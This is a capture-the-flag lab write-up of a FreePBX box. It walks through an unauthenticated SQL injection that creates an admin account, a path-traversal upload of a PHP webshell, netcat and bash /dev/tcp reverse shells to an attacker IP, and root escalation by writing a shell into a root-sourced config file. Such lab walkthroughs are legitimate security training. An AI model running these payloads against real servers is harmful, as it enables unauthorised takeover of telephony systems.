![logo](Images/logo.png)

# Attack Chain

```
└─► FreePBX 16.0.40.7 exposed
    └─► CVE-2025-57819 (unauth SQLi ajax.php)
        └─► Insert values inside ampusers → admin test:Password123!
            └─► CVE-2025-61678 (auth file upload)
                └─► Webshell PHP inside webroot → RCE
                    └─► Reverse shell → Shell as asterisk
                        └─► incron → dahdi_restart → sysadmin_dahdi_restart as root
                            └─► /etc/init.d/dahdi → source /etc/dahdi/init.conf
                                └─► payload reverse shell inside init.conf + trigger
                                    └─► Shell as root
```
# Summary

- [Enumeration](#enumeration)
- [Website](#website)
- [CVE-2025-57819 - Auth bypass](#cve-2025-57819---auth-bypass)
- [CVE-2025-61678 - Arbitrary File Upload](#cve-2025-61678---arbitrary-file-upload)
	- [Burp Request](#burp-request)
	- [Remote Code Execution](#remote-code-execution)
	- [Shell as asterisk](#shell-as-asterisk)
- [Privilege Escalation](#privilege-escalation)

---
# Enumeration

Let's start by scanning target's open ports.

```bash
nmap -sCV 10.129.*.* 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-08 04:42 EDT
Nmap scan report for 10.129.*.*
Host is up (0.0081s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_ssl-date: TLS randomness does not represent time
| http-title: 404 Not Found
|_Requested resource was config.php
```

Only 3, 2 concerning web and a redirection is made at `connected.htb`. Let's add the entry to our `/etc/hosts` file.

```bash
echo '10.129.*.* connected.htb' | tee -a /etc/hosts
```

# Website

![FreeBPX](Images/FreeBPX.png)

We land on the **FreeBPX** application. The version used is **16.0.40.7** according to the information at the bottom of the page.

# CVE-2025-57819 - Auth bypass

From the known version, i found that the target is vulnerable to **CVE-2025-57819**, an unauthenticated SQL injection in `ajax.php`.

Let's validate our find with that request.

```bash
curl -i -k "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
HTTP/1.1 500 Internal Server Error
Date: Mon, 08 Jun 2026 12:15:21 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
X-Powered-By: PHP/7.4.16
Set-Cookie: PHPSESSID=3t40fk4ffvqtupkgtcefro2hvn; expires=Wed, 08-Jul-2026 12:15:21 GMT; Max-Age=2592000; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Transfer-Encoding: chunked
Content-Type: application/json

{"error":{"type":"Exception","message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~USER:freepbxuser@localhost~'::","file":"\/var\/www\/html\/admin\/libraries\/utility.functions.php","line":123}}# 
```

It worked, now we can create an admin by inserting values in the `ampuser` database.

Our SQL payload will be the following :

```
x';INSERT INTO ampusers (username,password_sha1,sections) VALUES ('test',SHA1('Password123!'),'*')-- -"
```

We URL encode it, and we use `curl` to trigger the vulnerability.

```bash
curl -s -k "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x%27%3BINSERT%20INTO%20ampusers%20%28username%2Cpassword_sha1%2Csections%29%20VALUES%20%28%27test%27%2CSHA1%28%27Password123%21%27%29%2C%27%2A%27%29--%20-"
```

We should now be able to authenticate in the administration panel.


We now have an admin session.

![admin session](Images/admin%20session.png)

# CVE-2025-61678 - Arbitrary File Upload

Another CVE regarding **FreeBPX** is the **CVE-2025-61678**, an arbitrary file upload vulnerability with a module from the application.

In order to exploit the vulnerabilty, we can upload a webshell at the root path of the target application which will grant us an RCE on the system.

### Burp Request

To do that, we can simply open `Burpsuite` and send the following request inside repeater :

```
POST /admin/ajax.php?module=endpoint&command=upload_cust_fw HTTP/1.1
Host: connected.htb
Authorization: Basic dGVzdDpQYXNzd29yZDEyMyE=
Cookie: PHPSESSID=uol4j31ais6llomq4f2svrig3b
Referer: http://connected.htb/admin/config.php?display=endpoint&view=custfwupgrade
Content-Type: multipart/form-data; boundary=----geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7
Connection: close
Content-Length: 1353

------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7
Content-Disposition: form-data; name="dzuuid"

48069f49-c03e-4182-81f7-48e36622e0d3
------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7
Content-Disposition: form-data; name="dzchunkindex"

0
------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7
Content-Disposition: form-data; name="dztotalfilesize"

3292
------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7
Content-Disposition: form-data; name="dzchunksize"

2000000
------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7
Content-Disposition: form-data; name="dztotalchunkcount"

1
------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7
Content-Disposition: form-data; name="dzchunkbyteoffset"

0
------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7
Content-Disposition: form-data; name="fwbrand"

../../../var/www/html/poc
------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7
Content-Disposition: form-data; name="fwmodel"

1
------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7
Content-Disposition: form-data; name="fwversion"

1
------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php system($_REQUEST['cmd']); ?>

------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7--
```

### Remote Code Execution

Let's check if it worked as expected.

```bash
curl -sk "https://connected.htb/poc/shell.php?cmd=id"
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

We have an RCE as the user `asterisk`. 

### Shell as asterisk

Let's send us a reverse shell.

```bash
curl -sk "https://connected.htb/poc/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E157%209001%20%3E%2Ftmp%2Ff%0A"
```

```bash
penelope -i tun0 -p 9001

[asterisk@connected poc]$
```

# Privilege Escalation

After basic enumeration for privilege escalation, i found the following :

```bash
[asterisk@connected tmp]$ ps aux

<SNIP>

root        758  0.0  0.0  15044  2812 ?        Ss   08:39   0:00 /usr/sbin/incrond

<SNIP>
```

**incron** is a cron job that triggers because of events. Let's check its config.

```bash
[asterisk@connected tmp]$ cat /etc/incron.d/legacy
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
```

It monitors `/var/spool/asterisk/sysadmin/dahdi_restart`  and the event **IN_CLOSE_WRITE** occurs when a file is open, modified and closed. When it occurs, incron will execute `/usr/sbin/sysadmin_dahdi_restart` as root.

Let's check if we have write access on it.

```bash
ls -la /var/spool/asterisk/sysadmin/dahdi_restart
-rw-rw-r--. 1 asterisk asterisk 0 Sep  8  2021 /var/spool/asterisk/sysadmin/dahdi_restart
```

We are in the `asterisk` group, which mean we have write access.

`/etc/init.d/dahdi restart` contains the following

```bash
cat /etc/init.d/dahdi | grep init.conf

# config: /etc/dahdi/init.conf
# Don't edit the following values. Edit /etc/dahdi/init.conf instead.
[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
```

The source (`.`) will execute the content as `root`. 

```bash
[asterisk@connected tmp]$ ls -la /etc/dahdi/init.conf
-rw-r--r--. 1 asterisk asterisk 771 Jun  5  2023 /etc/dahdi/init.conf
```

And we have write access to the `init.conf` file.

So everything we add to the source of `/etc/dahdi/init.conf` will be execute as `root` when dahdi restart and we can trigger it by writing inside the file monitored by `incron`.

First, let's write a reverse shell payload inside `/etc/dahdi/init.conf`.

```bash
echo 'bash -i >& /dev/tcp/10.10.14.157/6767 0>&1' >> /etc/dahdi/init.conf
```

Then we can trigger the restart by writing inside `/var/spool/asterisk/sysadmin/dahdi_restart`.

```bash
echo hacked > /var/spool/asterisk/sysadmin/dahdi_restart
```

And we should get a reverse shell as `root`.

```bash
nc -lvnp 6767

[root@connected /]#
```

Machine rooted.